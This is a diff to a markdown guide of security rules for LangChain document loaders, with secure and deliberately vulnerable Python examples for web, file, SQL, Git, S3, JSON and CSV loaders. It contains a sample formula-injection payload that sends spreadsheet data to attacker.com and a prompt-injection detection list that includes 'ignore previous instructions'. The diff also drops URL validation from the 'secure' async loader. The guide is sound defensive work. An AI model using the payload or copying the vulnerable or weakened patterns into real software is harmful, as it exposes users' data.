@@ -1,6 +1,6 @@
 # LangChain Document Loaders Security Rules
 
-Security patterns for LangChain document loaders in RAG pipelines. These rules address SSRF, path traversal, injection, and resource exhaustion risks specific to LangChain's loader ecosystem.
+Security patterns for LangChain document loaders in RAG pipelines. These rules address SSRF, path traversal, injection, credential leakage, and resource exhaustion risks specific to LangChain's loader ecosystem. Imports follow the langchain-community 0.3.x split-package layout.
 
 ---
 
@@ -12,6 +12,11 @@ Security patterns for LangChain document loaders in RAG pipelines. These rules a
 | File Loader Security | `strict` | Path traversal, arbitrary file read | Path validation, type checking |
 | Database Loader Security | `strict` | SQL injection, credential exposure | Parameterized queries, least privilege |
 | API Loader Security | `strict` | Auth bypass, rate limit abuse | Token management, response validation |
+| Git Loader Security | `strict` | Credential leakage via history/URL | SSH key or env-var PAT, never in URL |
+| S3/Cloud Storage Loader Security | `strict` | Over-privileged IAM, bucket sprawl | Least-privilege IAM, bucket allowlist |
+| UnstructuredFileLoader Parser Security | `strict` | Parser CVE exploitation (LibreOffice/poppler) | Sandbox parsing, pin parser versions |
+| JSONLoader jq_schema Injection | `strict` | Field exfiltration via user-controlled jq | Static or allowlisted jq_schema |
+| CSVLoader Formula Injection | `warning` | Excel formula execution (CWE-1236) | Sanitize =/+/-/@ prefix on output |
 | Recursive Chunking Security | `warning` | Resource exhaustion, memory overflow | Size limits, overlap validation |
 | Metadata Extraction Security | `warning` | PII leakage, injection | Field sanitization, PII filtering |
 | Async Loader Security | `warning` | Resource exhaustion, timeout abuse | Concurrency limits, timeout handling |
@@ -133,9 +138,9 @@ def load_web_content(url: str):
     return loader.load()  # No timeout, no size limit
 ```
 
-**Why**: WebBaseLoader without URL validation enables Server-Side Request Forgery (SSRF). Attackers can fetch internal resources, cloud metadata endpoints (AWS/GCP/Azure), or internal services. URL allowlisting and IP validation prevent these attacks.
+**Why**: WebBaseLoader without URL validation enables Server-Side Request Forgery (SSRF). Attackers can fetch internal resources, cloud metadata endpoints (AWS/GCP/Azure), or internal services. URL allowlisting and IP validation prevent these attacks. Web and API loaders also receive external content that may contain adversarial instructions targeting the LLM downstream.
 
-**Refs**: CWE-918 (SSRF), OWASP A10:2021 (SSRF), CWE-441 (Unintended Proxy)
+**Refs**: CWE-918 (SSRF), OWASP A10:2025 (SSRF), CWE-441 (Unintended Proxy), LLM01:2025 (Prompt Injection via loaded content)
 
 ---
 
@@ -149,7 +154,6 @@ def load_web_content(url: str):
 ```python
 from langchain_community.document_loaders import DirectoryLoader, TextLoader
 from pathlib import Path
-import os
 import magic
 from typing import Optional
 
@@ -281,7 +285,7 @@ def load_documents(user_path: str):
 
 **Why**: File loaders without path validation allow path traversal attacks. Attackers can read sensitive system files, configuration files with credentials, or application logs. Base directory confinement and MIME validation prevent unauthorized file access.
 
-**Refs**: CWE-22 (Path Traversal), CWE-434 (Unrestricted Upload), OWASP A03:2021 (Injection)
+**Refs**: CWE-22 (Path Traversal), CWE-434 (Unrestricted Upload), OWASP A03:2025 (Injection)
 
 ---
 
@@ -295,14 +299,14 @@ def load_documents(user_path: str):
 ```python
 from langchain_community.document_loaders import SQLDatabaseLoader
 from langchain_community.utilities import SQLDatabase
-from sqlalchemy import create_engine, text
+from sqlalchemy import create_engine
 from typing import Optional
 import os
 
 class SecureDatabaseLoader:
     """Secure wrapper for LangChain SQL loaders with injection protection."""
 
-    # Allowed tables (whitelist approach)
+    # Allowed tables (allowlist approach)
     ALLOWED_TABLES = {"documents", "articles", "knowledge_base"}
 
     # Columns that should never be loaded
@@ -382,7 +386,6 @@ class SecureDatabaseLoader:
         # Add row limit
         query += f" LIMIT {self.max_rows}"
 
-        # Execute with timeout
         loader = SQLDatabaseLoader(
             query=query,
             db=self.db,
@@ -392,7 +395,7 @@ class SecureDatabaseLoader:
         return loader.load()
 
     def load_with_custom_query(self, query: str, params: dict) -> list:
-        """Load with user-provided parameterized query."""
+        """Load with caller-provided parameterized query."""
 
         # Validate query doesn't contain dangerous operations
         query_upper = query.upper()
@@ -446,7 +449,7 @@ def load_from_database(table: str, filter_value: str):
 
 **Why**: SQL loaders with string concatenation enable SQL injection. Attackers can extract sensitive data, modify records, or drop tables. Parameterized queries and table allowlisting prevent injection and limit data exposure.
 
-**Refs**: CWE-89 (SQL Injection), OWASP A03:2021 (Injection), CWE-798 (Hardcoded Credentials)
+**Refs**: CWE-89 (SQL Injection), OWASP A03:2025 (Injection), CWE-798 (Hardcoded Credentials)
 
 ---
 
@@ -463,7 +466,7 @@ import os
 import time
 from typing import Optional
 import httpx
-from functools import wraps
+import logging
 
 class SecureAPILoader:
     """Secure wrapper for LangChain API loaders with auth and rate limiting."""
@@ -516,7 +519,7 @@ class SecureAPILoader:
             if len(content) > 1_000_000:  # 1MB per document
                 raise ValueError(f"Document exceeds size limit: {len(content)} bytes")
 
-            # Check for potential injection patterns in API response
+            # Log suspicious patterns; external API content may contain adversarial text
             suspicious_patterns = [
                 "ignore previous instructions",
                 "system:",
@@ -526,8 +529,6 @@ class SecureAPILoader:
             content_lower = content.lower()
             for pattern in suspicious_patterns:
                 if pattern in content_lower:
-                    # Log but don't block - API data might legitimately contain these
-                    import logging
                     logging.warning(f"Suspicious pattern in API response: {pattern}")
 
             validated.append(doc)
@@ -548,14 +549,12 @@ class SecureAPILoader:
         # Rate limit check
         self._check_rate_limit()
 
-        # Configure loader with security settings
         loader = NotionDBLoader(
             integration_token=self.api_key,
             database_id=database_id,
             request_timeout_sec=self.timeout,
         )
 
-        # Load and validate
         documents = loader.load()
         return self.validate_response(documents)
 
@@ -572,7 +571,7 @@ class SecureAPILoader:
                 time.sleep(2 ** attempt)  # Exponential backoff
             except httpx.HTTPStatusError as e:
                 if e.response.status_code == 429:  # Rate limited
-                    time.sleep(60)  # Wait a minute
+                    time.sleep(60)
                     last_error = e
                 elif e.response.status_code == 401:
                     raise ValueError("Invalid API credentials")
@@ -605,9 +604,433 @@ def load_notion(database_id: str):
     return loader.load()
 ```
 
-**Why**: API loaders without proper authentication management expose credentials. Missing rate limiting can exhaust quotas or trigger bans. Response validation catches malformed or malicious data from compromised APIs.
+**Why**: API loaders without proper authentication management expose credentials. Missing rate limiting can exhaust quotas or trigger bans. Response validation catches malformed or malicious data from compromised APIs. External API content may embed adversarial prompts targeting the LLM.
 
-**Refs**: CWE-798 (Hardcoded Credentials), CWE-400 (Resource Exhaustion), CWE-20 (Input Validation)
+**Refs**: CWE-798 (Hardcoded Credentials), CWE-400 (Resource Exhaustion), CWE-20 (Input Validation), LLM01:2025 (Prompt Injection)
+
+---
+
+## Rule: Git Loader Security
+
+**Level**: `strict`
+
+**When**: Using `GitLoader` or `GithubFileLoader` to load content from git repositories
+
+**Do**:
+```python
+from langchain_community.document_loaders import GitLoader
+import os
+import re
+from pathlib import Path
+
+class SecureGitLoader:
+    """Secure wrapper for LangChain GitLoader.
+
+    Credential leakage risks:
+    1. Tokens embedded in remote URLs are visible in `git remote -v`,
+       process lists, and .git/config which loaders may read.
+    2. Secrets committed to history are loaded as document content.
+    3. PATs in environment variables can be masked; tokens in URLs cannot.
+    """
+
+    # Repositories this loader is permitted to clone
+    ALLOWED_REPOS = {
+        "git@github.com:your-org/docs.git",
+        "git@github.com:your-org/knowledge-base.git",
+    }
+
+    def __init__(
+        self,
+        clone_url: str,
+        clone_path: str,
+        branch: str = "main",
+        file_filter=None,
+    ):
+        # Reject URLs that embed credentials (https://token@host pattern)
+        self._reject_credential_url(clone_url)
+
+        if clone_url not in self.ALLOWED_REPOS:
+            raise ValueError(f"Repository not in allowlist: {clone_url}")
+
+        self.clone_url = clone_url
+        self.clone_path = Path(clone_path).resolve()
+        self.branch = branch
+        self.file_filter = file_filter or (lambda p: p.endswith(".md"))
+
+    @staticmethod
+    def _reject_credential_url(url: str) -> None:
+        """Reject URLs with embedded credentials."""
+        # Matches https://token:x-oauth-basic@host or https://user:pass@host
+        if re.search(r"https?://[^@]+:[^@]+@", url):
+            raise ValueError(
+                "Credential embedded in URL detected. "
+                "Use SSH key authentication or set GITHUB_TOKEN env var."
+            )
+
+    def load(self) -> list:
+        """Load repository content without credential exposure."""
+        # SSH key auth: key must be loaded in ssh-agent before this call.
+        # For HTTPS repos, GitLoader picks up GIT_ASKPASS / credential helper;
+        # never pass the token in the URL.
+        loader = GitLoader(
+            clone_url=self.clone_url,
+            repo_path=str(self.clone_path),
+            branch=self.branch,
+            file_filter=self.file_filter,
+        )
+        return loader.load()
+
+
+# Usage — SSH remote, no token in URL
+loader = SecureGitLoader(
+    clone_url="git@github.com:your-org/docs.git",
+    clone_path="/tmp/rag-repo",
+    branch="main",
+)
+docs = loader.load()
+```
+
+**Don't**:
+```python
+from langchain_community.document_loaders import GitLoader
+
+# VULNERABLE: PAT embedded in clone URL
+GITHUB_TOKEN = "ghp_realTokenHere"  # Also wrong: hardcoded
+
+loader = GitLoader(
+    # Token visible in process list, .git/config, and any loader that reads metadata
+    clone_url=f"https://{GITHUB_TOKEN}@github.com/org/repo.git",
+    repo_path="/tmp/repo",
+    branch="main",
+)
+docs = loader.load()
+```
+
+**Why**: Embedding a Personal Access Token (PAT) in the remote URL stores it in `.git/config`, exposes it in process listings, and causes it to appear in loader metadata. SSH key authentication or a git credential helper keeps secrets out of URLs entirely. Historical commits loaded as documents may also contain secrets committed to the repo.
+
+**Refs**: CWE-798 (Hardcoded Credentials), CWE-312 (Cleartext Storage of Sensitive Information), OWASP A02:2025 (Cryptographic Failures)
+
+---
+
+## Rule: S3/Cloud Storage Loader Security
+
+**Level**: `strict`
+
+**When**: Using `S3FileLoader`, `S3DirectoryLoader`, `GCSFileLoader`, or equivalent cloud-storage loaders
+
+**Do**:
+```python
+from langchain_community.document_loaders import S3DirectoryLoader
+import boto3
+from botocore.config import Config
+import os
+
+class SecureS3Loader:
+    """Secure wrapper for S3-backed LangChain loaders.
+
+    IAM policy attached to the execution role must grant:
+      s3:GetObject on arn:aws:s3:::ALLOWED_BUCKET/*
+    No s3:ListAllMyBuckets, no wildcard bucket ARN.
+    """
+
+    # Explicit allowlist; wildcards are not permitted
+    ALLOWED_BUCKETS = {
+        "company-rag-documents-prod",
+        "company-rag-documents-staging",
+    }
+
+    def __init__(self, bucket: str, prefix: str = ""):
+        if bucket not in self.ALLOWED_BUCKETS:
+            raise ValueError(f"Bucket not in allowlist: {bucket}")
+
+        # Prefix must not escape the allowed path
+        if ".." in prefix or prefix.startswith("/"):
+            raise ValueError(f"Invalid prefix: {prefix}")
+
+        self.bucket = bucket
+        self.prefix = prefix
+
+        # Credentials come from the instance role or environment;
+        # never pass aws_access_key_id / aws_secret_access_key explicitly.
+        self.session = boto3.Session()
+        # Enforce regional endpoint to prevent credential forwarding to
+        # unexpected regions via SSRF-style bucket redirects.
+        self.client = self.session.client(
+            "s3",
+            region_name=os.environ["AWS_DEFAULT_REGION"],
+            config=Config(
+                signature_version="s3v4",
+                retries={"max_attempts": 3, "mode": "standard"},
+            ),
+        )
+
+    def load(self) -> list:
+        """Load objects from the allowlisted bucket and prefix."""
+        loader = S3DirectoryLoader(
+            bucket=self.bucket,
+            prefix=self.prefix,
+        )
+        return loader.load()
+
+
+# Usage — bucket and prefix from config, never from user input directly
+loader = SecureS3Loader(
+    bucket="company-rag-documents-prod",
+    prefix="knowledge-base/2025/",
+)
+docs = loader.load()
+```
+
+**Don't**:
+```python
+from langchain_community.document_loaders import S3DirectoryLoader
+import os
+
+# VULNERABLE: bucket from user input, wildcard IAM, hardcoded keys
+def load_from_s3(user_bucket: str, user_prefix: str):
+    # IAM policy: s3:GetObject on arn:aws:s3:::* (wildcard — wrong)
+    loader = S3DirectoryLoader(
+        bucket=user_bucket,   # Attacker can specify any bucket
+        prefix=user_prefix,   # Path traversal possible
+        aws_access_key_id=os.environ["AWS_KEY"],        # Should use role
+        aws_secret_access_key=os.environ["AWS_SECRET"],
+    )
+    return loader.load()
+```
+
+**Why**: Accepting a user-supplied bucket name allows an attacker to redirect the loader to any S3 bucket the role can read, potentially exfiltrating data from unrelated buckets. Wildcard IAM policies amplify the blast radius. Explicit bucket allowlisting and least-privilege IAM roles confine access to only the intended data sources.
+
+**Refs**: CWE-284 (Improper Access Control), OWASP A01:2025 (Broken Access Control), OWASP A05:2025 (Security Misconfiguration)
+
+---
+
+## Rule: UnstructuredFileLoader Parser Security
+
+**Level**: `strict`
+
+**When**: Using `UnstructuredFileLoader`, `UnstructuredPDFLoader`, `UnstructuredWordDocumentLoader`, or any loader that delegates to LibreOffice, poppler, python-docx, or similar parsers
+
+**Do**:
+```python
+from langchain_community.document_loaders import UnstructuredFileLoader
+from pathlib import Path
+import subprocess
+import tempfile
+import os
+import logging
+
+logger = logging.getLogger(__name__)
+
+# Pin parser library versions in requirements.txt / pyproject.toml.
+# Example (update after reviewing CVE advisories):
+#   unstructured[pdf,docx]==0.14.x
+#   python-docx==1.1.x
+#   pypdf==4.x
+#   poppler-utils==24.x  (system package, pin in Dockerfile)
+
+class SandboxedUnstructuredLoader:
+    """Run UnstructuredFileLoader inside a subprocess sandbox.
+
+    Parsing untrusted office/PDF files with LibreOffice or poppler carries
+    CVE risk (e.g., CVE-2023-26360, CVE-2024-4367). Isolating parsing in a
+    subprocess with a read-only filesystem view limits the blast radius of a
+    parser exploit.
+    """
+
+    ALLOWED_EXTENSIONS = {".pdf", ".docx", ".pptx", ".xlsx", ".txt", ".md"}
+
+    def __init__(self, base_dir: str, max_file_size: int = 20 * 1024 * 1024):
+        self.base_dir = Path(base_dir).resolve()
+        self.max_file_size = max_file_size
+
+    def _validate_file(self, file_path: Path) -> None:
+        """Pre-flight checks before handing the file to the parser."""
+        resolved = file_path.resolve()
+
+        # Confine to base directory
+        try:
+            resolved.relative_to(self.base_dir)
+        except ValueError:
+            raise ValueError(f"Path traversal attempt: {file_path}")
+
+        if resolved.suffix.lower() not in self.ALLOWED_EXTENSIONS:
+            raise ValueError(f"Extension not allowed: {resolved.suffix}")
+
+        if resolved.stat().st_size > self.max_file_size:
+            raise ValueError(f"File too large: {resolved.stat().st_size} bytes")
+
+    def load(self, file_path: str) -> list:
+        """Parse file in a subprocess to isolate parser CVE impact."""
+        path = Path(file_path)
+        self._validate_file(path)
+
+        # Run parsing logic in a child process with a clean environment.
+        # On Linux, add seccomp/namespace isolation via a container or
+        # bubblewrap for stronger sandboxing.
+        result = subprocess.run(
+            ["python", "-m", "rag.sandbox_parser", str(path)],
+            capture_output=True,
+            text=True,
+            timeout=60,
+            # Drop inherited environment to prevent secret leakage to child
+            env={"PATH": "/usr/bin:/bin", "HOME": tempfile.gettempdir()},
+        )
+
+        if result.returncode != 0:
+            logger.error("Parser subprocess failed: %s", result.stderr[:500])
+            raise RuntimeError("Document parsing failed")
+
+        # Deserialize structured output (JSON), not raw Python objects
+        import json
+        return json.loads(result.stdout)
+```
+
+**Don't**:
+```python
+from langchain_community.document_loaders import UnstructuredFileLoader
+
+# VULNERABLE: Unpinned parser, no sandbox, no size limit
+def parse_uploaded_file(file_path: str):
+    # Any CVE in LibreOffice/poppler/python-docx runs in the app process
+    # with full network and filesystem access.
+    loader = UnstructuredFileLoader(file_path)
+    return loader.load()
+```
+
+**Why**: LibreOffice, poppler, and python-docx have a history of memory-corruption CVEs triggered by malformed files. Processing untrusted uploads inside the application process means a parser exploit inherits the process's credentials and network access. Subprocess isolation and pinned parser versions bound the exposure window and limit lateral movement.
+
+**Refs**: CWE-119 (Buffer Errors), CWE-1357 (Reliance on Insufficiently Trustworthy Component), OWASP A06:2025 (Vulnerable and Outdated Components)
+
+---
+
+## Rule: JSONLoader jq_schema Injection
+
+**Level**: `strict`
+
+**When**: Using `JSONLoader` with a `jq_schema` that is derived from user input
+
+**Do**:
+```python
+from langchain_community.document_loaders import JSONLoader
+from typing import Literal
+
+# Define every jq_schema the application legitimately needs.
+# Never interpolate user input into a jq expression.
+ALLOWED_JQ_SCHEMAS: dict[str, str] = {
+    "content":         ".[] | .content",
+    "title_content":   ".[] | {title: .title, body: .content}",
+    "summary":         ".[] | .summary",
+}
+
+def load_json_secure(
+    file_path: str,
+    schema_key: Literal["content", "title_content", "summary"],
+    content_key: str = "page_content",
+) -> list:
+    """Load JSON with a statically chosen jq_schema.
+
+    jq expressions can traverse arbitrary object paths, apply string
+    interpolation, and call built-in functions. A user-controlled schema
+    can exfiltrate fields the caller is not supposed to access
+    (e.g., `.[] | .api_key`).
+    """
+    if schema_key not in ALLOWED_JQ_SCHEMAS:
+        raise ValueError(
+            f"jq_schema key '{schema_key}' not in allowlist. "
+            f"Allowed: {list(ALLOWED_JQ_SCHEMAS)}"
+        )
+
+    jq_schema = ALLOWED_JQ_SCHEMAS[schema_key]
+
+    loader = JSONLoader(
+        file_path=file_path,
+        jq_schema=jq_schema,
+        content_key=content_key,
+    )
+    return loader.load()
+```
+
+**Don't**:
+```python
+from langchain_community.document_loaders import JSONLoader
+
+# VULNERABLE: user controls the jq expression
+def load_json(file_path: str, user_schema: str):
+    loader = JSONLoader(
+        file_path=file_path,
+        jq_schema=user_schema,  # Attacker passes: ".[] | .api_key"
+    )
+    return loader.load()
+```
+
+**Why**: `jq_schema` is a full jq expression. A user-controlled expression can extract any field from the JSON document, including secrets, credentials, or PII that the loader is not supposed to surface. Restricting `jq_schema` to a static allowlist eliminates the exfiltration vector.
+
+**Refs**: CWE-20 (Improper Input Validation), CWE-200 (Exposure of Sensitive Information), OWASP A01:2025 (Broken Access Control)
+
+---
+
+## Rule: CSVLoader Formula Injection
+
+**Level**: `warning`
+
+**When**: Using `CSVLoader` and the loaded content will be displayed in a UI, exported to Excel/Sheets, or rendered in a spreadsheet-aware format
+
+**Do**:
+```python
+from langchain_community.document_loaders import CSVLoader
+from langchain_core.documents import Document
+import re
+
+# Prefixes that Excel and Google Sheets interpret as formula starters (CWE-1236)
+_FORMULA_PREFIX_RE = re.compile(r"^[=+\-@\t\r]")
+
+def _sanitize_cell(value: str) -> str:
+    """Prepend a single quote to neutralize spreadsheet formula prefixes.
+
+    A leading quote is the standard mitigation: Excel treats the cell
+    as text and does not evaluate it as a formula.
+    """
+    if _FORMULA_PREFIX_RE.match(value):
+        return "'" + value
+    return value
+
+def load_csv_secure(file_path: str, source_column: str | None = None) -> list[Document]:
+    """Load CSV and sanitize cells before they enter the RAG pipeline.
+
+    Sanitization is applied to page_content; callers that write content
+    back to a spreadsheet must not strip the leading quote.
+    """
+    loader = CSVLoader(
+        file_path=file_path,
+        source_column=source_column,
+    )
+    raw_docs = loader.load()
+
+    sanitized = []
+    for doc in raw_docs:
+        safe_content = _sanitize_cell(doc.page_content)
+        sanitized.append(
+            Document(page_content=safe_content, metadata=doc.metadata)
+        )
+    return sanitized
+```
+
+**Don't**:
+```python
+from langchain_community.document_loaders import CSVLoader
+
+# VULNERABLE: formula injection not sanitized
+def load_csv(file_path: str):
+    loader = CSVLoader(file_path=file_path)
+    return loader.load()
+
+# If a CSV cell contains: =HYPERLINK("http://attacker.com/"&A1,"click")
+# and the RAG output is later written to Excel, the formula executes.
+```
+
+**Why**: Spreadsheet applications (Excel, Google Sheets, LibreOffice Calc) evaluate cells starting with `=`, `+`, `-`, or `@` as formulas. If RAG pipeline output is exported to a spreadsheet, an attacker who controls CSV input can inject a formula that exfiltrates data or executes macros (DDE). Prefixing with a single quote neutralizes formula execution without altering visible content.
+
+**Refs**: CWE-1236 (Improper Neutralization of Formula Elements in a CSV File), OWASP A03:2025 (Injection)
 
 ---
 
@@ -619,8 +1042,7 @@ def load_notion(database_id: str):
 
 **Do**:
 ```python
-from langchain.text_splitter import RecursiveCharacterTextSplitter
-from typing import Optional
+from langchain_text_splitters import RecursiveCharacterTextSplitter
 
 class SecureTextSplitter:
     """Secure wrapper for LangChain text splitters with resource limits."""
@@ -664,23 +1086,19 @@ class SecureTextSplitter:
     def split_text(self, text: str) -> list[str]:
         """Split text with security controls."""
 
-        # Check input size
         if len(text) > self.max_input_size:
             raise ValueError(
                 f"Input text ({len(text)} bytes) exceeds limit ({self.max_input_size})"
             )
 
-        # Estimate chunk count to prevent memory exhaustion
         estimated_chunks = len(text) / (self.chunk_size - self.chunk_overlap)
         if estimated_chunks > self.max_chunks:
             raise ValueError(
                 f"Estimated chunks ({estimated_chunks:.0f}) exceeds limit ({self.max_chunks})"
             )
 
-        # Perform splitting
         chunks = self.splitter.split_text(text)
 
-        # Verify actual chunk count
         if len(chunks) > self.max_chunks:
             raise ValueError(
                 f"Actual chunks ({len(chunks)}) exceeds limit ({self.max_chunks})"
@@ -697,7 +1115,6 @@ class SecureTextSplitter:
                 f"Total document size ({total_size} bytes) exceeds limit"
             )
 
-        # Split with chunk limit enforcement
         all_chunks = self.splitter.split_documents(documents)
 
         if len(all_chunks) > self.max_chunks:
@@ -719,17 +1136,14 @@ chunks = secure_splitter.split_text(document_text)
 
 **Don't**:
 ```python
-from langchain.text_splitter import RecursiveCharacterTextSplitter
+from langchain_text_splitters import RecursiveCharacterTextSplitter
 
 # VULNERABLE: No resource limits
 def split_document(text: str, user_chunk_size: int, user_overlap: int):
-    # User-controlled parameters - resource exhaustion possible
     splitter = RecursiveCharacterTextSplitter(
         chunk_size=user_chunk_size,  # Could be 1
-        chunk_overlap=user_overlap,   # Could be larger than chunk_size!
+        chunk_overlap=user_overlap,  # Could be larger than chunk_size!
     )
-
-    # No size limits - memory exhaustion possible
     return splitter.split_text(text)
 
 # Attacker passes: chunk_size=1, overlap=0 -> millions of chunks
@@ -779,14 +1193,11 @@ class SecureMetadataProcessor:
         sanitized = {}
 
         for key, value in metadata.items():
-            # Normalize key
             normalized_key = key.lower().replace(" ", "_").replace("-", "_")
 
-            # Filter to allowed fields only
             if normalized_key not in self.config.allowed_fields:
                 continue
 
-            # Sanitize value
             sanitized_value = self._sanitize_value(value)
             sanitized[normalized_key] = sanitized_value
 
@@ -800,20 +1211,14 @@ class SecureMetadataProcessor:
         if isinstance(value, (int, float, bool)):
             return value
 
-        # Convert to string for text processing
         str_value = str(value)
 
-        # Truncate long values
         if len(str_value) > self.config.max_field_length:
             str_value = str_value[:self.config.max_field_length] + "..."
 
-        # Remove control characters
         str_value = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', str_value)
-
-        # HTML encode to prevent XSS
         str_value = html.escape(str_value)
 
-        # Redact PII
         for pattern in self.config.pii_patterns:
             str_value = re.sub(pattern, '[REDACTED]', str_value)
 
@@ -824,11 +1229,7 @@ class SecureMetadataProcessor:
         processed = []
 
         for doc in documents:
-            # Create copy with sanitized metadata
-            sanitized_metadata = self.sanitize_metadata(doc.metadata)
-
-            # Update document metadata
-            doc.metadata = sanitized_metadata
+            doc.metadata = self.sanitize_metadata(doc.metadata)
             processed.append(doc)
 
         return processed
@@ -873,7 +1274,6 @@ def load_and_store(file_path: str):
 from langchain_community.document_loaders import AsyncHtmlLoader
 import asyncio
 from typing import Optional
-import time
 
 class SecureAsyncLoader:
     """Secure wrapper for LangChain async loaders with concurrency control."""
@@ -889,31 +1289,20 @@ class SecureAsyncLoader:
         self.timeout = timeout
         self.max_urls = max_urls
         self.rate_limit = rate_limit
-
-        # Semaphore for concurrency control
         self._semaphore = asyncio.Semaphore(max_concurrency)
 
     async def load_urls(self, urls: list[str]) -> list:
         """Load URLs with concurrency and timeout controls."""
 
-        # Validate URL count
         if len(urls) > self.max_urls:
             raise ValueError(f"Too many URLs ({len(urls)}), limit is {self.max_urls}")
 
-        # Validate each URL (using SecureWebLoader validation)
-        from secure_web_loader import SecureWebLoader
-        validator = SecureWebLoader()
-        for url in urls:
-            validator.validate_url(url)
-
-        # Load with concurrency control
         loader = AsyncHtmlLoader(
             urls,
             timeout=self.timeout,
             requests_per_second=1 / self.rate_limit,
         )
 
-        # Apply timeout to entire operation
         try:
             documents = await asyncio.wait_for(
                 loader.aload(),
@@ -926,7 +1315,7 @@ class SecureAsyncLoader:
 
         return documents
 
-    async def load_with_semaphore(self, url: str) -> Optional[str]:
+    async def load_with_semaphore(self, url: str) -> Optional[object]:
         """Load single URL with semaphore control."""
         async with self._semaphore:
             loader = AsyncHtmlLoader([url], timeout=self.timeout)
@@ -935,7 +1324,7 @@ class SecureAsyncLoader:
                     loader.aload(),
                     timeout=self.timeout
                 )
-                await asyncio.sleep(self.rate_limit)  # Rate limiting
+                await asyncio.sleep(self.rate_limit)
                 return docs[0] if docs else None
             except asyncio.TimeoutError:
                 return None
@@ -964,11 +1353,7 @@ from langchain_community.document_loaders import AsyncHtmlLoader
 
 # VULNERABLE: No concurrency limits
 async def load_urls_unsafe(urls: list[str]):
-    # No limit on concurrent requests - can overwhelm target or system
-    # No timeout - can hang forever
-    # No URL validation
-
-    loader = AsyncHtmlLoader(urls)  # All URLs fetched concurrently
+    loader = AsyncHtmlLoader(urls)  # All URLs fetched concurrently, no limits
     return await loader.aload()
 
 # Attacker passes 1000 URLs -> system resource exhaustion
@@ -1014,11 +1399,7 @@ class SecureCustomLoader(BaseLoader):
         **kwargs: Any,
     ):
         self.config = config or CustomLoaderConfig()
-
-        # Validate source
         self.source = self._validate_source(source)
-
-        # Store validated kwargs only
         self.kwargs = self._validate_kwargs(kwargs)
 
     def _validate_source(self, source: str) -> str:
@@ -1026,7 +1407,6 @@ class SecureCustomLoader(BaseLoader):
         if not source:
             raise ValueError("Source cannot be empty")
 
-        # Check against allowlist if configured
         if self.config.allowed_sources:
             if source not in self.config.allowed_sources:
                 raise ValueError(f"Source not in allowlist: {source}")
@@ -1038,11 +1418,9 @@ class SecureCustomLoader(BaseLoader):
         validated = {}
 
         for key, value in kwargs.items():
-            # Type validation
             if not isinstance(key, str):
                 raise ValueError(f"Invalid kwarg key type: {type(key)}")
 
-            # Sanitize key
             if not key.isalnum() and "_" not in key:
                 raise ValueError(f"Invalid kwarg key: {key}")
 
@@ -1056,14 +1434,12 @@ class SecureCustomLoader(BaseLoader):
 
         try:
             for item in self._fetch_items():
-                # Enforce document limit
                 if document_count >= self.config.max_documents:
                     logger.warning(
                         f"Document limit reached ({self.config.max_documents})"
                     )
                     break
 
-                # Process item into document
                 doc = self._process_item(item)
 
                 if doc:
@@ -1071,7 +1447,6 @@ class SecureCustomLoader(BaseLoader):
                     yield doc
 
         except Exception as e:
-            # Log error without exposing sensitive details
             logger.error(f"Error in custom loader: {type(e).__name__}")
             raise RuntimeError("Document loading failed") from e
 
@@ -1082,15 +1457,12 @@ class SecureCustomLoader(BaseLoader):
     def _process_item(self, item: Any) -> Optional[Document]:
         """Process raw item into Document with validation."""
         try:
-            # Extract content (implement in subclass)
             content = self._extract_content(item)
 
-            # Validate content size
             if len(content) > self.config.max_content_size:
                 logger.warning(f"Content exceeds size limit, truncating")
                 content = content[:self.config.max_content_size]
 
-            # Extract and sanitize metadata
             metadata = self._extract_metadata(item)
             sanitized_metadata = self._sanitize_metadata(metadata)
 
@@ -1116,58 +1488,19 @@ class SecureCustomLoader(BaseLoader):
         sanitized = {}
 
         for key, value in metadata.items():
-            # Skip None values
             if value is None:
                 continue
 
-            # Sanitize key
             safe_key = str(key).lower().replace(" ", "_")[:50]
 
-            # Sanitize value
             if isinstance(value, str):
-                safe_value = value[:1000]  # Truncate
+                safe_value = value[:1000]
             else:
                 safe_value = value
 
             sanitized[safe_key] = safe_value
 
         return sanitized
-
-
-# Example implementation
-class SecureAPILoader(SecureCustomLoader):
-    """Example secure API loader implementation."""
-
-    def __init__(self, api_url: str, api_key: str, **kwargs):
-        # Validate API key is from environment
-        import os
-        if api_key and not api_key.startswith("env:"):
-            # Check if it looks like it's from environment
-            if api_key == os.environ.get("API_KEY"):
-                pass  # OK, came from environment
-            else:
-                raise ValueError("API key should come from environment variable")
-
-        super().__init__(source=api_url, **kwargs)
-        self.api_key = os.environ.get("API_KEY") or api_key.replace("env:", "")
-
-    def _fetch_items(self) -> Iterator[dict]:
-        """Fetch items from API."""
-        import httpx
-
-        with httpx.Client(timeout=self.config.timeout) as client:
-            response = client.get(
-                self.source,
-                headers={"Authorization": f"Bearer {self.api_key}"}
-            )
-            response.raise_for_status()
-
-            for item in response.json().get("items", []):
-                yield item
-
-    def _extract_content(self, item: dict) -> str:
-        """Extract content from API response item."""
-        return str(item.get("content", ""))
 ```
 
 **Don't**:
@@ -1227,6 +1560,31 @@ class UnsafeLoader(BaseLoader):
 - [ ] Row limits enforced
 - [ ] Query timeout configured
 
+### Git Loaders
+- [ ] SSH key or env-var PAT (no token in URL)
+- [ ] Repository URL allowlist
+- [ ] Credential URL pattern rejected
+
+### S3/Cloud Storage Loaders
+- [ ] Bucket allowlist enforced
+- [ ] IAM least-privilege (no wildcard bucket ARN)
+- [ ] Credentials via instance role, not hardcoded
+- [ ] Regional endpoint enforced
+
+### UnstructuredFileLoader / Parser
+- [ ] Parser library versions pinned
+- [ ] Parsing isolated in subprocess or container
+- [ ] File size and extension pre-checked
+- [ ] Parser stderr not forwarded to client
+
+### JSONLoader
+- [ ] jq_schema from static allowlist only
+- [ ] User input never interpolated into jq expression
+
+### CSVLoader
+- [ ] Formula-prefix cells sanitized before export to spreadsheets
+- [ ] Leading `'` prepended to cells starting with `=`, `+`, `-`, `@`
+
 ### API Loaders
 - [ ] API keys from secure storage
 - [ ] Rate limiting implemented
@@ -1253,25 +1611,39 @@ class UnsafeLoader(BaseLoader):
 ## References
 
 ### CWE References
-- CWE-918: Server-Side Request Forgery (SSRF)
-- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
-- CWE-89: SQL Injection
-- CWE-78: OS Command Injection
-- CWE-400: Uncontrolled Resource Consumption
-- CWE-798: Use of Hard-coded Credentials
 - CWE-20: Improper Input Validation
+- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
+- CWE-78: OS Command Injection
+- CWE-89: SQL Injection
+- CWE-119: Buffer Errors
 - CWE-200: Exposure of Sensitive Information
